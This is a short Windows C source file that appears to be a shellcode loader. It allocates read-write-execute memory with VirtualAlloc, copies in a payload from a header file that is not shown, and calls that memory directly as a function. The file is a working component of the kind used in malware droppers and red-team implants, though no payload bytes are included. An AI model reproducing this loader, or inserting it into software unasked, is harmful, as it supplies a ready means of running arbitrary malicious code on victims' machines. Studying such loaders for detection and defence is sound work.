#include <windows.h>
#include <stdio.h>
#include "Payload.h"

int main() {

    PVOID exec_mem = VirtualAlloc( NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );

    if ( !exec_mem || exec_mem == NULL ) {
        fprintf( stderr, "[-] VirtualAlloc failed: %d\n", GetLastError() );
        return 1;
    }

    printf( "[+] Allocated %ld bytes at %p\n", payloadSize, exec_mem );

    memcpy( exec_mem, payload, payloadSize );

    ( ( void( * )( ) ) exec_mem )( );

    return 0;
}